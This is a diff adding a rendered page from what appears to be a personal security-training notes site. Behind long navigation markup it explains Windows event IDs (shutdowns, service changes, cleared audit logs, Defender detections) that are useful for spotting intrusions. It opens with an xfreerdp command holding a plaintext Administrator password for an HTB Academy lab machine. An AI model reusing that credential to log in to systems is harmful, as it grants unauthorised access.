+        <li class="md-nav__item">
+  <a href="#2-windows-security-logs" class="md-nav__link">
+    <span class="md-ellipsis">
+      2. Windows Security Logs
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Web%20requests/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Web requests
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_4_2" id="__nav_4_2_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Challenges
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_4_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_4_2">
+            <span class="md-nav__icon md-icon"></span>
+            Challenges
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Challenges/ApacheBlaze/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    ApacheBlaze
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Challenges/C.O.P/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    C.O.P
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Challenges/Distract%20and%20Destroy/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Distract and Destroy (Blockchain)
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Challenges/DoxPit/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    DoxPit
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Challenges/Neonify/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Neonify
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Challenges/Oxidized%20ROP/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Oxidized ROP
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Challenges/PDFy/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    PDFy.md
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Challenges/Photon%20Lockdown/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Photon Lockdown (Hardware)
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Challenges/ProxyAsAService/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    ProxyAsAService
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Challenges/RenderQuest/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    RenderQuest
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Challenges/Watersnake/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Watersnake
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Challenges/baby%20website%20rick/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    baby website rick
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Challenges/jscalc/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    jscalc
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_4_3" id="__nav_4_3_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Machines
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_4_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_4_3">
+            <span class="md-nav__icon md-icon"></span>
+            Machines
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Machines/Aero/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Aero
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Machines/Arkham/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Arkham
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Machines/Axlle/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Axlle
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Machines/Blazorized/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Blazorized
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Machines/Blurry/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Blurry
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Machines/BoardLight/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    BoardLight
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Machines/Bucket/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Bucket
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Machines/Celestial/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Celestial
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Machines/Compiled/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Compiled
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Machines/Editorial/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Editorial - Season 5
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Machines/Escape/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Escape
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Machines/FormulaX/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    FormulaX - Season 4
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Machines/GreenHorn/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    GreenHorn
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Machines/Headless/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Headless - Season 4
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Machines/IClean/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    IClean - Released on 06 Apr 2024
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Machines/Intuition/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Intuition - Season 5
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Machines/Jab/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Jab - Season 4
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Machines/Mailing/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Mailing - Season 5
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Machines/Mist/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Mist - Season 4
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Machines/Monitored/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Monitored - Season 4
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Machines/Office/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Office - Season 4
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Machines/Outdated/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Outdated
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Machines/Perfection/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Perfection - Season 4
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Machines/PermX/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    PermX
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Machines/Runner/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Runner - Season 5
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Machines/Scrambled/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Scrambled
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Machines/Sea/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Sea
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Machines/SolarLab/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    SolarLab
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Machines/SteamCloud/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    SteamCloud
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Machines/Usage/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Usage - Released on 13 Apr 2024
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Machines/WifineticTwo/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    WifineticTwo - Season 4
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+    
+      
+      
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5" >
+        
+          
+          <label class="md-nav__link" for="__nav_5" id="__nav_5_label" tabindex="">
+            
+  
+  <span class="md-ellipsis">
+    Notes
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_5_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_5">
+            <span class="md-nav__icon md-icon"></span>
+            Notes
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../Notes/Change%20Mysql%20pw%20in%20Linux/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Change root user's password in Mysql Linux
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../Notes/Create%20multi%20shell/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Create multiple shells from one shell
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../Notes/File%20upload/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    File upload
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../Notes/Transfer%20file%20to%20local/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Transfer file from remote to local
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../Notes/VPN/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    VPN
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../Notes/payloads%20for%20SSRF/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    payloads for SSRF
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+    
+      
+      
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_6" >
+        
+          
+          <label class="md-nav__link" for="__nav_6" id="__nav_6_label" tabindex="">
+            
+  
+  <span class="md-ellipsis">
+    OffSec playground
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_6_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_6">
+            <span class="md-nav__icon md-icon"></span>
+            OffSec playground
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../OffSec%20playground/CVE-2024-25180/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    CVE-2024-25180
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../OffSec%20playground/Hepet/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Hepet
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../OffSec%20playground/OSCPExamTips/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    OSCPExamTips
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+    
+      
+      
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_7" >
+        
+          
+          <label class="md-nav__link" for="__nav_7" id="__nav_7_label" tabindex="">
+            
+  
+  <span class="md-ellipsis">
+    Others
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_7_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_7">
+            <span class="md-nav__icon md-icon"></span>
+            Others
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../Others/Bastion/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Ministry of Magic
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../Others/Job/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Job
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../Others/NZISM%26PSR/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    NZISM & PSR
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../Others/Use%20WSL%20to%20Install%20Ubuntu%20on%20Windows%2011/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Use WSL to Install Ubuntu on Windows 11
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+    
+      
+      
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_8" >
+        
+          
+          <label class="md-nav__link" for="__nav_8" id="__nav_8_label" tabindex="">
+            
+  
+  <span class="md-ellipsis">
+    PortSwigger Labs
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_8_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_8">
+            <span class="md-nav__icon md-icon"></span>
+            PortSwigger Labs
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../PortSwigger%20Labs/Access%20control%20vulnerabilities/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Access control vulnerabilities
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../PortSwigger%20Labs/Authentication/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Authentication
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../PortSwigger%20Labs/CORS/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Cross-origin resource sharing (CORS)
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../PortSwigger%20Labs/CSRF/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Cross-site request forgery (CSRF)
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../PortSwigger%20Labs/Clickjacking/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Click jacking
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../PortSwigger%20Labs/File%20upload%20vulnerabilities/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    File upload vulnerabilities
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../PortSwigger%20Labs/GraphQL%20API%20vulnerabilities/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    GraphQL API vulnerabilities
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../PortSwigger%20Labs/HTTP%20Host%20header%20attacks/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    HTTP Host header attacks
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../PortSwigger%20Labs/Information%20disclosure/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Information disclosure
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../PortSwigger%20Labs/Insecure%20deserialization/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Insecure deserialization
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../PortSwigger%20Labs/JWT/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    JWT (Json Web Tokens)
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../PortSwigger%20Labs/NoSQL%20injection/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    NoSQL injection
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../PortSwigger%20Labs/OAuth%20authentication/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    OAuth authentication
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../PortSwigger%20Labs/OS%20command%20injection/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    OS command injection
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../PortSwigger%20Labs/Path%20traversal/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Path traversal
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../PortSwigger%20Labs/Race%20conditions/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Race conditions
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../PortSwigger%20Labs/SQL%20injection/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    SQL injection
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../PortSwigger%20Labs/SSRF/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Server-side request forgery (SSRF)
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../PortSwigger%20Labs/Web%20LLM%20attacks/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Web LLM (Large Language Model) attacks
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../PortSwigger%20Labs/Web%20cache%20poisoning/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Web cache poisoning
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../PortSwigger%20Labs/WebSockets/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    WebSockets
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../PortSwigger%20Labs/XSS/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Cross-site script (XSS)
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../PortSwigger%20Labs/XXE%20injection/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    XML external entity (XXE) injection
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../PortSwigger%20Labs/server-side%20template%20injection/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Sever-side template injection
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#1-windows-system-logs" class="md-nav__link">
+    <span class="md-ellipsis">
+      1. Windows System Logs
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#2-windows-security-logs" class="md-nav__link">
+    <span class="md-ellipsis">
+      2. Windows Security Logs
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+<h1 id="useful-windows-event-logs">Useful Windows Event Logs</h1>
+<pre><code class="language-bash">$ xfreerdp /u:Administrator /p:'HTB_@cad3my_lab_W1n10_r00t!@0' /v:[Target IP] /dynamic-resolution
+</code></pre>
+<h2 id="1-windows-system-logs">1. Windows System Logs</h2>
+<p><strong>Event ID 1074 (System Shutdown/Restart):</strong> This event log indicates when and why the system was shut down or restarted. By monitoring these events, you can determine if there are unexpected shutdowns or restarts, potentially revealing malicious activity such as malware infection or unauthorized user access.</p>
+<p><strong>Event ID 6005 (The Event log service was started):</strong> This event log marks the time when the Event Log Service was started. This is an important record, as it can signify a system boot-up, providing a starting point for investigating system performance or potential security incidents around that period. It can also be used to detect unauthorized system reboots.</p>
+<p><strong>Event ID 6006 (The Event log service was stopped):</strong> This event log signifies the moment when the Event Log Service was stopped. It is typically seen when the system is shutting down. Abnormal or unexpected occurrences of this event could point to intentional service disruption for covering illicit activities.</p>
+<p><strong>Event ID 6013 (Windows uptime):</strong> This event occurs once a day and shows the uptime of the system in seconds. A shorter than expected uptime could mean the system has been rebooted, which could signify a potential intrusion or unauthorized activities on the system.</p>
+<p><strong>Event ID 7040 (Service status change):</strong> This event indicates a change in service startup type, which could be from manual to automatic or vice versa. If a crucial service's startup type is changed, it could be a sign of system tampering.</p>
+<h2 id="2-windows-security-logs">2. Windows Security Logs</h2>
+<p><strong>Event ID 1102 (The audit log was cleared):</strong> Clearing the audit log is often a sign of an attempt to remove evidence of an intrusion or malicious activity.</p>
+<p><strong>Event ID 1116 (Antivirus malware detection):</strong> This event is particularly important because it logs when Defender detects a malware. A surge in these events could indicate a targeted attack or widespread malware infection.
+Event ID 1118 (Antivirus remediation activity has started): This event signifies that Defender has begun the process of removing or quarantining detected malware. It's important to monitor these events to ensure that remediation activities are successful.</p>
+<p><strong>Event ID 1119 (Antivirus remediation activity has succeeded):</strong> This event signifies that the remediation process for detected malware has been successful. Regular monitoring of these events will help ensure that identified threats are effectively neutralized.</p>
